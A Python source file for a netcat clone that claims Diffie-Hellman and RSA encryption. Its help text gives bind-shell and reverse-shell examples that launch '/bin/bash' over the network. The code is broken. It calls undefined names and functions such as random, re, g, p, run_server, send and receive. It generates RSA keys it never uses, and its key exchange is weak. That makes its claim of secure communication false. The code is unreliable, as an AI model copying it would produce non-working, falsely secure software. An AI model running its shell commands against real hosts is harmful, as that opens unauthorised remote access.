#!/usr/bin/env python3
"""Python netcat implementation with Diffie-Hellman and RSA encryption for secure communication."""

import argparse
import os
import socket
import sys
import threading
import hashlib
import rsa


UDP_CLIENT_ADDR = None
UDP_CLIENT_PORT = None

NAME = os.path.basename(sys.argv[0])
VERSION = "0.1.0-alpha"


def b2str(data):
    """Convert bytes into string type."""
    try:
        return data.decode("utf-8")
    except UnicodeDecodeError:
        pass
    try:
        return data.decode("utf-8-sig")
    except UnicodeDecodeError:
        pass
    try:
        return data.decode("ascii")
    except UnicodeDecodeError:
        return data.decode("latin-1")


def log(msg, level, verbose):
    """Log messages to stderr."""
    if level == "error":
        print("%s" % (msg), file=sys.stderr)
    elif level == "warning":
        print("%s" % (msg), file=sys.stderr)
    elif level == "info" and verbose > 0:
        print("%s" % (msg), file=sys.stderr)
    elif level == "debubg:" and verbose > 1:
        print("%s" % (msg), file=sys.stderr)
    else:
        print("Fatal, wrong logging level: '%s'. Please report this issue", file=sys.stderr)
        sys.exit(1)
# -------------------------------------------------------------------------------------------------
# CRYPTO FUNCTIONS
# -------------------------------------------------------------------------------------------------

def diffie_hellman_key_exchange():
    # Generate private key (random number)
    private_key = random.randint(10000, 65535)

    # Generate public key using private key and agreed-upon base and modulus
    public_key = (g ** private_key) % p

    # Send our public key to the server
    send_public_key(s, public_key)

    # Receive the server's public key
    server_public_key = receive_public_key(s)

    # Calculate the shared secret using the server's public key and our private key
    shared_secret = (server_public_key ** private_key) % p

    # Generate a 16-byte session key using the shared secret
    session_key = hashlib.sha256(str(shared_secret).encode()).digest()[:16]
    return session_key


def send_public_key(sock, public_key):
    # Convert public key to bytes
    public_key_bytes = str(public_key).encode()

    # Send the length of the public key as a 4-byte integer
    sock.send(len(public_key_bytes).to_bytes(4, 'big'))

    # Send the public key
    sock.send(public_key_bytes)


def receive_public_key(sock):
    # Receive the length of the public key as a 4-byte integer
    key_len = int.from_bytes(sock.recv(4), 'big')

    # Receive the public key and convert it to an integer
    public_key_bytes = sock.recv(key_len)
    public_key = int(public_key_bytes.decode())
    return public_key


# -------------------------------------------------------------------------------------------------
# CRYPTO INITIALIZATION FUNCTIONS
# -------------------------------------------------------------------------------------------------

def rsa_key_generation():
    # Generate RSA key pair
    public_key, private_key = rsa.newkeys(1024)
    return public_key, private_key


#
# Client (TCP+UDP)
#
def resolve(hostname, verbose=0):
    """Resolve hostname to IP addr or return False in case of error."""
    if verbose > 0:
        print("Resolving:  %s" % (hostname), file=sys.stderr)
    try:
        return socket.gethostbyname(hostname)
    except socket.gaierror as error:
        print("[Resolve Error] %s" % (error), file=sys.stderr)
        return False


#
# Client (TCP+UDP)
#
def connect(s, addr, port, verbose=0):
    """Connect to a server via IP addr/port."""
    if verbose > 0:
        print("Connecting: %s:%i" % (addr, port), file=sys.stderr)
    try:
        s.connect((addr, port))
    except socket.error as error:
        print("[Connect Error] %s" % (error), file=sys.stderr)
        print(s, file=sys.stderr)
        s.close()
        sys.exit(1)


# -------------------------------------------------------------------------------------------------
# CLIENT
# -------------------------------------------------------------------------------------------------

def run_client(host, port, udp=False, bufsize=1024, crlf=False, verbose=0, rsa_public_key=None):
    """Connect to host:port and send data."""
    s = create_socket(udp=udp, verbose=verbose)

    addr = resolve(host, verbose=verbose)
    if not addr:
        s.close()
        sys.exit(1)

    if udp:
        UDP_CLIENT_ADDR = addr
        UDP_CLIENT_PORT = port
    else:
        connect(s, addr, port, verbose=verbose)

    # Perform Diffie-Hellman key exchange and get the session key
    session_key = diffie_hellman_key_exchange()

    # Start sending and receiving threads with RSA encryption
    tr = threading.Thread(
        target=receive, args=(s,), kwargs={"udp": udp, "bufsize": bufsize, "verbose": verbose}
    )
    ts = threading.Thread(
        target=send, args=(s,), kwargs={"udp": udp, "crlf": crlf, "verbose": verbose}
    )
    # If the main thread kills, this thread will be killed too.
    tr.daemon = True
    ts.daemon = True
    # Start threads
    tr.start()
    ts.start()

    # Do cleanup on the main program
    while True:
        if not tr.is_alive():
            s.close()
            sys.exit(0)
        if not ts.is_alive():
            s.close()
            sys.exit(0)


def get_version():
    """Return version information."""
    return """%(prog)s: Version %(version)s (%(url)s) by %(author)s""" % (
        {
            "prog": NAME,
            "version": VERSION,
            "url": "https://github.com/cytopia/netcat",
            "author": "cytopia",
        }
    )


def _args_check_port(value):
    """Check arguments for invalid port number."""
    min_port = 1
    max_port = 65535
    intvalue = int(value)

    if intvalue < min_port or intvalue > max_port:
        raise argparse.ArgumentTypeError("%s is an invalid port number." % value)
    return intvalue


def _args_check_forwards(value):
    """Check forward argument (-L/-R) for correct pattern."""
    match = re.search(r"(.+):(.+)", value)
    if match is None or len(match.groups()) != 2:
        raise argparse.ArgumentTypeError("%s is not a valid 'addr:port' format." % value)
    _args_check_port(match.group(2))
    return value


def get_args():
    """Retrieve command line arguments."""
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter,
        add_help=False,
        usage="""%(prog)s [-Cnuv] [-e cmd] hostname port
       %(prog)s [-Cnuv] [-e cmd] -l [hostname] port
       %(prog)s [-Cnuv] -L addr:port [hostname] port
       %(prog)s [-Cnuv] -R addr:port hostname port
       %(prog)s -V, --version
       %(prog)s -h, --help
       """
        % ({"prog": NAME}),
        description="Netcat implementation in Python with connect, listen and forward mode.",
        epilog="""examples:

  Create bind shell
    %(prog)s -l -e '/bin/bash' 8080

  Create reverse shell
    %(prog)s -e '/bin/bash' example.com 4444

  Local forward: Make localhost port available to another interface
    %(prog)s -L 127.0.0.1:3306 192.168.0.1 3306

  Remote forward: Forward local port to remote server
    %(prog)s -R 127.0.0.1:3306 example.com 4444"""
        % ({"prog": NAME}),
    )

    positional = parser.add_argument_group("positional arguments")
    mode = parser.add_argument_group("mode arguments")
    optional = parser.add_argument_group("optional arguments")
    misc = parser.add_argument_group("misc arguments")

    positional.add_argument(
        "hostname", nargs="?", type=str, help="Address to listen, forward or connect to"
    )
    positional.add_argument(
        "port", type=_args_check_port, help="Port to listen, forward or connect to"
    )

    mode.add_argument(
        "-l",
        "--listen",
        action="store_true",
        help="Listen mode: Enable listen mode for inbound connects",
    )
    mode.add_argument(
        "-L",
        "--local",
        metavar="addr:port",
        type=_args_check_forwards,
        help="""Local forward mode: Specify local <addr>:<port> to which traffic
should be forwarded to.
Netcat will listen locally (specified by hostname and port) and
forward all traffic to the specified value for -L/--local.""",
    )
    mode.add_argument(
        "-R",
        "--remote",
        metavar="addr:port",
        type=_args_check_forwards,
        help="""Remote forward mode: Specify local <addr>:<port> from which traffic
should be forwarded from.
Netcat will connect remotely (specified by hostname and port) and
for ward all traffic from the specified value for -R/--remote.""",
    )

    optional.add_argument(
        "-e",
        "--exec",
        metavar="cmd",
        type=str,
        help="Execute shell command. Only works with connect or listen mode.",
    )
    optional.add_argument(
        "-C", "--crlf", action="store_true", help="Send CRLF as line-endings (default: LF)",
    )
    optional.add_argument(
        "-n", "--nodns", action="store_true", help="Do not resolve DNS",
    )
    optional.add_argument("-u", "--udp", action="store_true", help="UDP mode")
    optional.add_argument(
        "-v",
        "--verbose",
        action="count",
        default=0,
        help="Be verbose and print info to stderr. Use -vv or -vvv for more verbosity.",
    )
    misc.add_argument("-h", "--help", action="help", help="Show this help message and exit")
    misc.add_argument(
        "-V",
        "--version",
        action="version",
        version=get_version(),
        help="Show version information and exit",
    )
    args = parser.parse_args()

    # Check mutually exclive arguments
    if args.exec is not None and (args.local is not None or args.remote is not None):
        parser.print_usage()
        print(
            "%s: error: -e/--cmd cannot be used together with -L/--local or -R/--remote" % (NAME),
            file=sys.stderr,
        )
        sys.exit(1)
    if args.listen and (args.local is not None or args.remote is not None):
        parser.print_usage()
        print(
            "%s: error: -l/--listen cannot be used together with -L/--local or -R/--remote"
            % (NAME),
            file=sys.stderr,
        )
        sys.exit(1)
    if args.local is not None and args.remote is not None:
        parser.print_usage()
        print(
            "%s: error: -L/--local cannot be used together with -R/--remote" % (NAME),
            file=sys.stderr,
        )
        sys.exit(1)

    # Required arguments
    if args.hostname is None and (not args.listen and args.local is None):
        parser.print_usage()
        print(
            "%s: error: the following arguments are required: hostname" % (NAME), file=sys.stderr,
        )
        sys.exit(1)

    return args


# -------------------------------------------------------------------------------------------------
# MAIN ENTRYPOINT
# -------------------------------------------------------------------------------------------------

def main():
    """Start the program."""
    args = get_args()

    # Perform RSA key generation for secure communication
    rsa_public_key, rsa_private_key = rsa_key_generation()

    listen_backlog = 1
    receive_buffer = 1024
    hostname = args.hostname if args.hostname is not None else "0.0.0.0"

    if args.listen:
        run_server(
            hostname,
            args.port,
            args.udp,
            backlog=listen_backlog,
            bufsize=receive_buffer,
            crlf=args.crlf,
            verbose=args.verbose,
        )
    else:
        run_client(
            args.hostname,
            args.port,
            args.udp,
            bufsize=receive_buffer,
            crlf=args.crlf,
            verbose=args.verbose,
            rsa_public_key=rsa_public_key,  # Pass the public key to the client
        )


if __name__ == "__main__":
    # Catch Ctrl+c and exit without error message
    try:
        main()
    except KeyboardInterrupt:
        print()
        sys.exit(1)
